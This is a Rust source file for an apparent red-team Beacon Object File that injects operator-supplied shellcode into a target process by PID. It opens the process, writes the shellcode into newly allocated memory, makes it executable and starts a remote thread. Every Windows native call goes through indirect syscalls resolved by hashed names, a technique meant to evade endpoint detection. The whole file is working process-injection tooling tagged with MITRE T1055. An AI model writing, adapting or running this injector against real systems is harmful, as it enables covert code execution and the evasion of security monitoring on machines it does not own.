// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: TrustedSec/cs-remote-ops/ntcreatethread
//
//! Shellcode injection via indirect `NtCreateThreadEx` (10 args).
//!
//! Args: <pid:u32> <shellcode-hex>
//!
//! Flow (all indirect syscalls):
//!   NtOpenProcess              (PROCESS_CREATE_THREAD|VM_OPERATION|VM_WRITE|VM_READ|QUERY)
//!   NtAllocateVirtualMemory    (RW)
//!   NtWriteVirtualMemory
//!   NtProtectVirtualMemory     (→ RX)
//!   NtCreateThreadEx           (10-arg)
//!   NtClose

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use alloc::vec::Vec;
use common::{mitre::Technique, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1055",       name: "Process Injection",                                  tactic: "Defense Evasion" },
    Technique { id: "T1055.002",   name: "Portable Executable Injection (variant)",            tactic: "Defense Evasion" },
];

const PROCESS_ALL_NEEDED: u32 = 0x0002 | 0x0008 | 0x0010 | 0x0020 | 0x0400 | 0x1000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const STATUS_SUCCESS: i32 = 0;
const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;

#[repr(C)]
struct ObjectAttributes {
    length: u32, root_directory: usize, object_name: usize,
    attributes: u32, security_descriptor: usize, security_quality_of_service: usize,
}

#[repr(C)]
struct ClientId { unique_process: usize, unique_thread: usize }

fn parse_u32(s: &str) -> Option<u32> {
    let mut v: u32 = 0; let mut any = false;
    for b in s.bytes() {
        if !b.is_ascii_digit() { return None; }
        v = v.checked_mul(10)?.checked_add((b - b'0') as u32)?;
        any = true;
    }
    if any { Some(v) } else { None }
}

fn parse_hex(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 2);
    let mut hi: Option<u8> = None;
    for c in s.bytes() {
        let v = match c {
            b'0'..=b'9' => c - b'0',
            b'a'..=b'f' => c - b'a' + 10,
            b'A'..=b'F' => c - b'A' + 10,
            b' ' | b'\t' | b'\r' | b'\n' | b',' => continue,
            _ => return None,
        };
        match hi {
            None => hi = Some(v),
            Some(h) => { out.push((h << 4) | v); hi = None; }
        }
    }
    if hi.is_some() { return None; }
    if out.is_empty() { return None; }
    Some(out)
}

fn close_handle(h: usize) {
    use common::syscalls::{SyscallEntry, resolve, do_syscall4};
    static OP_CLOSE: SyscallEntry = SyscallEntry::new();
    const CLOSE_HASH: u32 = common::hash::djb2(b"NtClose");
    if let Ok((c_ssn, c_addr)) = unsafe { resolve(&OP_CLOSE, CLOSE_HASH) } {
        let _ = unsafe { do_syscall4(h, 0, 0, 0, c_ssn, c_addr) };
    }
}


#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let pid_str = String::from(parser.get_str());
    let sc_hex  = String::from(parser.get_str());
    let pid_str = pid_str.as_str();
    let sc_hex  = sc_hex.as_str();
    if pid_str.is_empty() || sc_hex.is_empty() {
        return Err("usage: inject-ntcreate <pid> <shellcode-hex>");
    }
    let pid: u32 = parse_u32(pid_str).ok_or("invalid pid")?;
    let mut sc = parse_hex(sc_hex).ok_or("invalid hex")?;

    use common::syscalls::{SyscallEntry, resolve, do_syscall4, do_syscall5, do_syscall6, do_syscall10};

    // 1. NtOpenProcess
    static OP_OPEN: SyscallEntry = SyscallEntry::new();
    const OPEN_HASH: u32 = common::hash::djb2(b"NtOpenProcess");
    let (op_ssn, op_addr) = unsafe { resolve(&OP_OPEN, OPEN_HASH) }
        .map_err(|_| "resolve")?;
    let oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0, object_name: 0, attributes: 0,
        security_descriptor: 0, security_quality_of_service: 0,
    };
    let cid = ClientId { unique_process: pid as usize, unique_thread: 0 };
    let mut h_proc: usize = 0;
    let s = unsafe {
        do_syscall4(
            &mut h_proc as *mut usize as usize,
            PROCESS_ALL_NEEDED as usize,
            &oa as *const _ as usize,
            &cid as *const _ as usize,
            op_ssn, op_addr,
        )
    };
    if s != STATUS_SUCCESS || h_proc == 0 {
        common::evasion::secure_zero(&mut sc);
        return Err("proc open failed");
    }

    // 2. NtAllocateVirtualMemory (6-arg)
    static OP_ALLOC: SyscallEntry = SyscallEntry::new();
    const ALLOC_HASH: u32 = common::hash::djb2(b"NtAllocateVirtualMemory");
    let (a_ssn, a_addr) = unsafe { resolve(&OP_ALLOC, ALLOC_HASH) }
        .map_err(|_| "resolve")?;
    let mut base: usize = 0;
    let mut sz: usize = sc.len();
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    let s2 = unsafe {
        do_syscall6(
            h_proc,
            &mut base as *mut usize as usize,
            0,
            &mut sz as *mut usize as usize,
            (MEM_COMMIT | MEM_RESERVE) as usize,
            PAGE_READWRITE as usize,
            a_ssn, a_addr,
        )
    };
    if s2 != STATUS_SUCCESS {
        close_handle(h_proc);
        common::evasion::secure_zero(&mut sc);
        return Err("alloc failed");
    }

    // 3. NtWriteVirtualMemory (5-arg)
    static OP_WRITE: SyscallEntry = SyscallEntry::new();
    const WRITE_HASH: u32 = common::hash::djb2(b"NtWriteVirtualMemory");
    let (w_ssn, w_addr) = unsafe { resolve(&OP_WRITE, WRITE_HASH) }
        .map_err(|_| "resolve")?;
    let mut written: usize = 0;
    let s3 = unsafe {
        do_syscall5(
            h_proc, base, sc.as_ptr() as usize, sc.len(),
            &mut written as *mut usize as usize,
            w_ssn, w_addr,
        )
    };
    common::evasion::secure_zero(&mut sc);
    if s3 != STATUS_SUCCESS {
        close_handle(h_proc);
        return Err("write failed");
    }

    // 4. NtProtectVirtualMemory → RX (5-arg)
    static OP_PROT: SyscallEntry = SyscallEntry::new();
    const PROT_HASH: u32 = common::hash::djb2(b"NtProtectVirtualMemory");
    let (p_ssn, p_addr) = unsafe { resolve(&OP_PROT, PROT_HASH) }
        .map_err(|_| "resolve")?;
    let mut base2 = base;
    let mut sz2 = written;
    let mut old_prot: u32 = 0;
    let s4 = unsafe {
        do_syscall5(
            h_proc,
            &mut base2 as *mut usize as usize,
            &mut sz2 as *mut usize as usize,
            PAGE_EXECUTE_READ as usize,
            &mut old_prot as *mut u32 as usize,
            p_ssn, p_addr,
        )
    };
    if s4 != STATUS_SUCCESS {
        close_handle(h_proc);
        return Err("protect failed");
    }

    // 5. NtCreateThreadEx (10-arg)
    //   ThreadHandle*, DesiredAccess, ObjectAttributes*, ProcessHandle,
    //   StartRoutine, Arg, CreateFlags, ZeroBits, StackSize, MaxStackSize,
    //   AttributeList
    // — that's 11 fields total but the last (AttributeList*) is optional.
    // The 10-arg variant we ship omits AttributeList (passes NULL via the
    // tail of args 9). The kernel reads exactly the args we set.
    static OP_NCT: SyscallEntry = SyscallEntry::new();
    const NCT_HASH: u32 = common::hash::djb2(b"NtCreateThreadEx");
    let (n_ssn, n_addr) = unsafe { resolve(&OP_NCT, NCT_HASH) }
        .map_err(|_| "resolve")?;
    let mut h_thr: usize = 0;
    let s5 = unsafe {
        do_syscall10(
            &mut h_thr as *mut usize as usize, // 0: ThreadHandle*
            THREAD_ALL_ACCESS as usize,        // 1: DesiredAccess
            0,                                  // 2: ObjectAttributes (NULL)
            h_proc,                             // 3: ProcessHandle
            base,                               // 4: StartRoutine = shellcode
            0,                                  // 5: Argument
            0,                                  // 6: CreateFlags = 0 (start running)
            0,                                  // 7: ZeroBits
            0,                                  // 8: StackSize
            0,                                  // 9: MaxStackSize / AttributeList
            n_ssn, n_addr,
        )
    };
    if s5 != STATUS_SUCCESS || h_thr == 0 {
        close_handle(h_proc);
        return Err("thread create failed");
    }

    close_handle(h_thr);
    close_handle(h_proc);
    obf! { let ok = "thread created"; }
    println!("[+] {} in pid {}", ok, pid);
    Ok(())
}
